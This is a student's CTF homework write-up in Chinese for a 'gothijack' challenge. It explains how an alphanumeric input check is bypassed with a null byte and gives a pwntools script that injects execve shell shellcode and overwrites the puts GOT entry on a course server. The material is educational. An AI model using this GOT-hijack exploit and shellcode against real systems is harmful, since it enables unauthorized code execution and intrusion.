hw2
===

## gothijack

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

### concept

該程式很單純的做了四件事

1. 輸入 name
2. 輸入想修改的 address
3. 輸入想修改的值
4. 輸出 done !

依題目提示可知是使用 got hijack 的技巧來達成攻擊，不過這題有 canary 不能直接 overflow 造出 ROP chain

不過有個可以可控的 buffer 可以利用，使用 gdb 觀察一下發現該處可寫可執行！！！

![](https://i.imgur.com/8RqKD74.png)

![](https://i.imgur.com/pauryBM.png)

如此就可以塞入 shellcode 並修改 puts 的 got 為 buffer address，使得最後要輸出時 call puts 會跳到寫好的 shellcode 執行

但是輸入的 buffer 讀進來後有個 check 函數檢查輸入要為 alpha 或 number，不過他是用 strlen 判斷長度可以使用 null byte 繞過，因為他是以 null byte 當作字串結尾

![](https://i.imgur.com/MmUJNOm.png)

所以我們可以在 shellcode 前面塞一個 null byte 繞過檢查，而之後 puts got 的值改成 buffer address + 1 即可

### exploit

使用 objdump 可以看到 puts 的 got

![](https://i.imgur.com/ZyWex9z.png)

```python
#!/usr/bin/env python

from pwn import *

# r = process('./gothijack')
r = remote('csie.ctf.tw', 10129)

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\
\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
puts_got = '601020'
buf_addr = 0x6010a1

r.recvuntil(':')
r.send('\x00' + shellcode)
r.recvuntil(':')
r.sendline(puts_got)
r.recvuntil(':')
r.sendline(p64(buf_addr))
r.interactive()
```

### flag

```FLAG{G0THiJJack1NG}```
